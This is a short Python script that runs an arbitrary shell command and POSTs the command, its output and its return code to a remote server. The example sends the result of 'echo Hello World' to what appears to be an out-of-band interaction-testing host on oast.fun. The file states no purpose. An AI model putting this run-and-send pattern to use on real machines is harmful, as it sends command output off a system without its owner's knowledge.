import subprocess
import requests

def run_command_and_send(command, server_url):
    try:
        # Run the command and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # Prepare the data
        data = {
            "command": command,
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "returncode": result.returncode
        }
        
        # Send to server
        response = requests.post(server_url, json=data)
        
        print("Server response:", response.text)

    except Exception as e:
        print("Error:", e)


# Example usage
server_url = "http://adaeblamolxntdjzwsuedl8ntju04fblb.oast.fun"
run_command_and_send("echo Hello World", server_url)
